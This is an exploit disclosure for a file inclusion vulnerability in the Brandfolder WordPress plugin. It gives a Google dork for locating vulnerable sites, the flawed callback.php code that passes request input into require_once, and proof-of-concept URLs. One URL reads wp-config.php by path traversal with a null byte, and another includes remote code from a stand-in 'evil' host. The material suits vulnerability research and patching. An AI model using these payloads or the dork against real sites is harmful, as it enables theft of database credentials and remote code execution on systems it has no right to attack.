# Google Dork: inurl:wp-content/plugins/brandfolder
# Date: 03/22/2016
# Exploit Author: AMAR^SHG
# Vendor Homepage: https://brandfolder.com
# Version: <=3.0
# Tested on: WAMP / Windows
 
I-Details
The vulnerability occurs at the first lines of the file callback.php:
 
<?php
  ini_set(&#039;display_errors&#039;,1);
  ini_set(&#039;display_startup_errors&#039;,1);
  error_reporting(-1);
 
  require_once($_REQUEST[&#039;wp_abspath&#039;]  . &#039;wp-load.php&#039;);
  require_once($_REQUEST[&#039;wp_abspath&#039;]  . &#039;wp-admin/includes/media.php&#039;);
  require_once($_REQUEST[&#039;wp_abspath&#039;]  . &#039;wp-admin/includes/file.php&#039;);
  require_once($_REQUEST[&#039;wp_abspath&#039;]  . &#039;wp-admin/includes/image.php&#039;);
  require_once($_REQUEST[&#039;wp_abspath&#039;]  . &#039;wp-admin/includes/post.php&#039;);
 
$_REQUEST is based on the user input, so as you can guess,
an attacker can depending on the context, host on a malicious server
a file called wp-load.php, and disable its execution using an htaccess, or
abuse the null byte character ( %00, %2500 url-encoded)
 
II-Proof of concept
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=LFI/RFI
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=http://evil/
 
Discovered by AMAR^SHG (aka kuroi&#039;sh).
Greetings to RxR & Nofawkx Al & HolaKo

